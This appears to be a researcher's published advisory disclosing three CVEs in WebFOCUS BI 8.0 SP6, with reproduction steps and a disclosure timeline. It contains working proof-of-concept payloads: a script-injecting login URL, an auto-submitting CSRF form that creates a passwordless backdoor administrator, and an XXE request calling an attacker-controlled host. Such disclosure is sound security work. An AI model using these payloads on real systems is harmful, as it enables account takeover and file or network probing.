<html>

<?php include '../header.php';?>

<body>

<?php include '../navbar.php';?>

<div class="body-content">
    <h2>
        Multiple Vulnerabilities in WebFocus BI (v.8.0 SP6)
    </h2>
    <div class="centre">
        <img class="headerpic" src="https://www.informationbuilders.com/sites/default/files/styles/customer_spotlight/public/2019-07/webfocus_bi_teaser5.jpg" alt="Hack the Planet" height="100px" width="100px" align="middle">
    </div>
    
    <p class="date">2020-06-22</p>
    <h3>Background</h3>
    <p class="text">
        WebFocus BI 8.0 (SP6) was prone to a multiple vulnerabilities including cross-site scripting (CVE-2020-14202), cross-site request forgery (CVE-2020-14203), and XXE injection (CVE-2020-14204). 

        An attacker could leverage these issues to:
        <ul>
        	<li>Execute JavaScript within the context of a victim's browser.</li>
        	<li>Make arbitrary web requests to privileged parts of the application (including requests resulting in remote code execution by leveraging CVE-2016-9044 or creating a backdoor administrative user account). </li>
        	<li>Perform blind enumeration of files, directories, and network services on the local system.</li>
    	</ul>
    </p>
    <p class="text">
        Vendor Link: <a href="https://www.informationbuilders.com/products/bi-and-analytics-platform">Information Builders (WebFOCUS)</a>
    </p>
    <p class="text">
        WebFOCUS BI is a business intelligence and analytics software that "provides organizations with everything they need to turn every kind of data into actionable insights for real business outcomes."  This platform seeks to organize, share, and optimize business data to all parts of the organization.  It is a Java-based software that supports a MSSQL back-end encompassing many different integration options.
    </p>
    <p class="text">
        Vulnerable version: 8.0 (SP6).  
    </p>
        <a id="CVE-2020-14202"><h4>Vulnerability - Unauthenticated XSS in login page (CVE-2020-14202)</h4></a>
        <p class="text">
           WebFOCUS Business Intelligence has a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site.  This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
        </p>
        <h4>Steps:</h4>
        <ol>
            <li>Within a browser such as Google Chrome, navigate to the affected URL: hxxps:///webfocusbi.mysite.com/ibi_apps/WPServlet?%22%3e%3cscript%3ealert(%22XSS+in+Arbitrary+Parameter%22)%3C/script%3E%3C%22=foobar&IBIF_adhocfex=nothing</li>
            <li>Observe that a pop up appears, indicating that JavaScript was injected into the page and executed.</li>
        </ol>
        <img class="body-img" src="/img/webfocus_xss.png" width="60%">
        <p class="text">
            Screenshot showing request, website response, and JavaScript execution.  
        </p>


        <a id="CVE-2020-14203"><h4>Vulnerability - CSRF in Administration Panel (CVE-2020-14203)</h4></a>
        <p class="text">
            WebFOCUS Business Intelligence allows a Cross-Site Request Forgery (CSRF) attack within the /ibi_apps/WFServlet(.ibfs) endpoint.  Leveraging this bug, an attacker may cause a victim user to conduct actions within the application.  For example, an administrative user may be caused to create a malicious administrative user with no password.
        </p>
        <h4>Steps to leverage CSRF to create a backdoor administrator):</h4>
        <ol>
            <li>The victim (administrative user) authenticates to the WebFOCUS administration panel ("/ibi_apps/") as an administrator.</li>
            <li>The victim visits a page with attacker-controlled content.  This may be an internal SharePoint site or a website on the internet. </li>
            <li>.  The attacker-controlled content contains the following HTML and JavaScript, which instructs the browser to add a new administrative user ("h00p") with no password. </br>
                <code>
				&lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;</br>
			  	&lt;form action="hxxps://webfocusbi.mysite.com/ibi_apps/WFServlet.ibfs"&gt;</br>
			    &lt;input type="hidden" name="IBFS1&#95;action" value="createUser" /&gt;</br>
			    &lt;input type="hidden" name="IBFS&#95;name" value=“h00p" /&gt;</br>
			    &lt;input type="hidden" name="IBFS&#95;description" value=“h00p" /&gt;</br>
			    &lt;input type="hidden" name="IBFS&#95;password" value="" /&gt;</br>
			    &lt;input type="hidden" name="IBFS&#95;email" value="" /&gt;</br>
			    &lt;input type="hidden" name="IBFS&#95;status" value="ACTIVE" /&gt;</br>
			    &lt;input type="hidden" name="IBFS&#95;initGroup" value="IBFS&#58;&#47;SSYS&#47;GROUPS&#47;Administrators" /&gt;</br>
			    &lt;input type="hidden" name="IBFS&#95;pSetList" value="" /&gt;</br>
			    &lt;input type="submit" value="Submit request" /&gt;</br>
			  	&lt;/form&gt;</br>
			  	&lt;script&gt;</br>
			    document.forms[0].submit();</br>
			  	&lt;/script&gt;</br>
              </code>
			</li>
            <li>When viewing the list of administrative users, the victim will notice that a new administrative user ("h00p") was added to the WebFOCUS BI application.</li>
        </ol>
        <img class="body-img" src="/img/webfocus_csrf.png" width="60%">
        <p class="text">
           The top left window displays the CSRF (HTML + JavaScript) payload.  The IBIWF_SES_AUTH_TOKEN was not included in the request.  This page was opened by the browser on the bottom left.  The browser made a request to the vulnerable WebFOCUS BI application, which returned a "SUCCESS" response.  Within the browser on the right, a new administrative user "h00p" is shown as part of the “Administrators” group.
        </p>

        <a id="CVE-2020-14202"><h4>Vulnerability - XXE in Administration Panel (CVE-2020-14204)</h4></a>
        <p class="text">
            WebFOCUS Business Intelligence administration portal allows remote attackers to read arbitrary local files or forge server-side HTTP requests via a crafted HTTP request to /ibi_apps/WFServlet.cfg because XML external entities injection is possible.  This is related to making changes to the application repository configuration. 
            The XML parser used by the application is configured unsafely, allowing administrative users to inject external XML entities into the application.
        </p>
        <h4>Steps:</h4>
        <ol>
            <li>As an administrative user, browse to the following URL: hxxps://webfocusbi.mysite.com
/ibi_apps/WFServlet.cfg?IBICFG_action=CFGPUT&IBICFG_objtype=WEBCONFIG&IBICFG_content=%3C%3Fxml+version%3D%271.0%27+encoding%3D%27ISO-8859-1%27+%3F%3E%3C!DOCTYPE+foo+SYSTEM+"http://attackerURL.com/foo.dtd"%3E%3Cibwfrpc+name%3D%27CFGPUT%27%3E%3Cobject+type%3D%27webconfig%27%3E%3C%2Fobject%3E%3Creturncode%3E10000%3C%2Freturncode%3E%3C%2Fibwfrpc%3E</li>
            <li>The IBICFG_content parameter corresponds to the following when URL-decoded:<code>
            &lt;?xml+version='1.0'+encoding='ISO-8859-1'+?&gt;
            &lt;!DOCTYPE+foo+SYSTEM+"http://attackerURL.com/foo.dtd"&gt;
            &lt;ibwfrpc+name='CFGPUT'&gt;
            &lt;object+type='webconfig'&gt;&lt;/object&gt;
            &lt;returncode&gt;10000&lt;/returncode&gt;
            &lt;/ibwfrpc&gt;
            </code></li>
            <li>This request will result in a HTTP request sent to attackerURL.com from the victim server.</li>
            <li>It also possible to enumerate open ports, local files, or network files with a time-based attack.</li>
        </ol>
        <p class="text">
            Note: no screenshots are available due to the complexity of the timing attack.  The timing attack was conducted by accessing local (network drive) files over SMB (file:///sharedrive/name/file.txt).  Files which existed took <1s to return a response.  Files which did not exist took >10s to return a response.  
        </p>
        <h4>Disclosure Timeline</h4>
        <ul>
        	<li>2020-02-28 - Initial responsible disclosure email sent to Information Builders (IBI) tech support (as indicated by their website).</li>
        	<li>2020-03-17 - IBI responded to inquiry and asked for additional information.</li>
        	<li>2020-03-17 - Sent vulnerability details and screenshots to IBI.  Suggested 90-day disclosure date (6/15).</li>
        	<li>2020-03-23 - Sent follow-up email to IBI requesting confirmation of vulnerabilities (no response).</li>
        	<li>2020-04-17 - Again, asked IBI if they had reviewed the vulnerabilities (no response).</li>
        	<li>2020-06-15 - Sent additional follow-up email to IBI informing them that the vulnerabilities would be submitted for CVE and public disclosure by 6/22.</li>
        	<li>2020-06-15 - IBI replied that the vulnerabilities were fixed years ago.</li>
        	<li>2020-06-22 - Public Disclosure.</li>
        </ul>
    </div>
     <?php include 'policy.php';?>
</body>

<?php include '../footer.php';?>

</html>
